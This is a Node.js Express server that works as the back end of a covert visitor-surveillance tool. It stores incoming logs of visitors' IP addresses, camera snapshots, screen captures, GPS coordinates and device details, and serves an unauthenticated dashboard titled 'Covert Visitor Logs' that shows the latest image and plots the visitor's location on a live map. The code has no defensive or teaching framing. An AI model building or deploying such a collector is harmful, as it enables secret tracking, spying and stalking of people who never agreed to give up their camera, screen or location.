const express = require("express");
const fs = require("fs");
const app = express();

// Allow large payloads for base64 images (Camera + Screen)
app.use(express.json({ limit: '10mb' }));
app.use(express.static("public"));

const LOGS_PATH = "gorilla-logs.json";

if (!fs.existsSync(LOGS_PATH)) {
  fs.writeFileSync(LOGS_PATH, "", "utf8");
}

app.post("/api/log", (req, res) => {
  const entry = req.body;
  fs.appendFileSync(LOGS_PATH, JSON.stringify(entry) + "\n", "utf8");
  console.log(`📋 ${entry.ip} | 📸 Cam: ${entry.cameraSnapshots ? entry.cameraSnapshots.length : 0} | 🖥️ Screen: ${entry.screenSnapshots ? entry.screenSnapshots.length : 0} | 📍 GPS: ${entry.gps ? entry.gps.lat + "," + entry.gps.lon : "N/A"}`);
  res.json({ ok: true });
});

app.get("/admin", (req, res) => {
  res.type("text/html").send(`
    <html><head><title>🦍 Covert Logs</title>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
      * { margin:0; padding:0; box-sizing:border-box; }
      body { font-family:monospace; background:#111; color:#eee; padding:20px; }
      h1 { color:#4ade80; margin-bottom:16px; }
      .grid { display:grid; grid-template-columns: 1fr 1fr; gap:20px; }
      .card { background:#1a1a1a; border:1px solid #333; border-radius:8px; padding:16px; }
      .card h3 { color:#4ade80; margin:0 0 8px; font-size:14px; }
      .row { display:flex; gap:12px; margin:4px 0; font-size:13px; }
      .label { color:#888; min-width:160px; }
      .val { color:#eee; word-break:break-all; }
      #map { height: 300px; width: 100%; border-radius: 8px; }
      .snapshot { width:100%; height:auto; border-radius:8px; margin-top:10px; }
      .live-indicator { color:#ff4500; animation:blink 1s infinite; }
      @keyframes blink { 50% { opacity:0.5; } }
    </style></head><body>
    <h1>🦍 Covert Visitor Logs <span class="live-indicator">● LIVE</span></h1>
    <div class="grid">
      <div class="card">
        <h3>Location</h3>
        <div id="map"></div>
      </div>
      <div class="card">
        <h3>Latest Snapshot</h3>
        <img id="latestSnap" src="" class="snapshot" alt="Latest Snapshot" />
        <div id="visitorInfo">
          <p>Loading...</p>
        </div>
      </div>
    </div>
    <script>
      const map = L.map('map').setView([20, 0], 2);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors'
      }).addTo(map);
      
      let marker = null;

      function updateUI(data) {
        if (!data || data.length === 0) return;
        
        // Get latest entry (last in array)
        const latest = data[data.length - 1];
        
        // Update Snapshot (Prefer Camera, fallback to Screen if no camera)
        let snapSrc = "";
        if (latest.cameraSnapshots && latest.cameraSnapshots.length > 0) {
          snapSrc = latest.cameraSnapshots[latest.cameraSnapshots.length - 1];
        } else if (latest.screenSnapshots && latest.screenSnapshots.length > 0) {
          snapSrc = latest.screenSnapshots[latest.screenSnapshots.length - 1];
        }
        
        if (snapSrc) {
          document.getElementById('latestSnap').src = snapSrc;
        }
        
        // Update Info
        document.getElementById('visitorInfo').innerHTML = 
          '<div class="row"><span class="label">IP</span><span class="val">'+latest.ip+'</span></div>'+
          '<div class="row"><span class="label">City</span><span class="val">'+(latest.ipGeo?latest.ipGeo.city+" , "+latest.ipGeo.country:"N/A")+'</span></div>'+
          '<div class="row"><span class="label">GPS Acc</span><span class="val">'+(latest.gps?latest.gps.accuracy+"m":"N/A")+'</span></div>'+
          '<div class="row"><span class="label">Platform</span><span class="val">'+latest.platform+'</span></div>'+
          '<div class="row"><span class="label">GPU</span><span class="val">'+(latest.gpu?latest.gpu.renderer:"n/a")+'</span></div>'+
          '<div class="row"><span class="label">Screen Shares</span><span class="val">'+(latest.screenSnapshots ? latest.screenSnapshots.length : 0)+'</span></div>';

        // Update Map
        let lat = latest.gps ? latest.gps.lat : (latest.ipGeo ? latest.ipGeo.lat : null);
        let lon = latest.gps ? latest.gps.lon : (latest.ipGeo ? latest.ipGeo.lon : null);
        
        if (lat && lon) {
          if (marker) {
            marker.setLatLng([lat, lon]);
          } else {
            marker = L.marker([lat, lon]).addTo(map);
            map.setView([lat, lon], 15);
          }
          marker.bindPopup('<b>'+latest.ip+'</b><br>'+(latest.ipGeo?latest.ipGeo.city:"Unknown"));
        }
      }

      function pollLogs() {
        fetch("/admin/raw").then(r=>r.json()).then(data=>{
          updateUI(data);
        });
      }

      pollLogs();
      setInterval(pollLogs, 5000); // Refresh every 5 seconds
    </script>
    </body></html>
  `);
});

app.get("/admin/raw", (req, res) => {
  fs.readFile(LOGS_PATH, "utf8", (err, data) => {
    if (err) return res.status(500).json([]);
    const lines = data.split("\n").filter(Boolean);
    const logs = lines.map(line => {
      try { return JSON.parse(line); } catch (e) { return null; }
    }).filter(Boolean);
    res.json(logs);
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`✅ Server running on port ${PORT}`);
});